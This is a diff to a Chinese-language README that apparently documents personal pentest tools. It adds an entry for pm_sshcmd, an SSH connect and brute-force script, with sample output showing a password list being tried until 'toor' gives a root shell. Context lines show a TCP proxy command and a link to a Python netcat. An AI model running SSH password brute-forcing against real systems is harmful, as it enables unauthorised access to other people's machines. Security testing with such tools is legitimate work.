@@ -24,3 +24,32 @@ C:\Users\cmd>python proxy-tcp.py -lh 127.0.0.1 -lp 21 -rh 192.168.203.132 -rp 21
 ```
 ### 0x03 netcat
 用法：[https://langkexiansheng.github.io/#/posts/py%E7%89%88netcat](https://langkexiansheng.github.io/#/posts/py%E7%89%88netcat)
+
+### 0x04 pm_sshcmd
+这个脚本可以用来连接ssh,也可以用来爆破ssh.
+运行效果
+```
+C:\Users\cmd>python3 pm_sshcmd.py
+尝试密码： yueshaowen
+Authentication failed.
+尝试密码： xxoo
+Authentication failed.
+尝试密码： admin..dds
+Authentication failed.
+尝试密码： xiaotao
+Authentication failed.
+尝试密码： xiaopi
+Authentication failed.
+尝试密码： xiaoli
+Authentication failed.
+尝试密码： xiaoguang
+Authentication failed.
+尝试密码： xiaodi
+Authentication failed.
+尝试密码： mumaasp.com
+Authentication failed.
+尝试密码： motax
+Authentication failed.
+尝试密码： toor
+破解成功，执行命令 whoami： root
+```
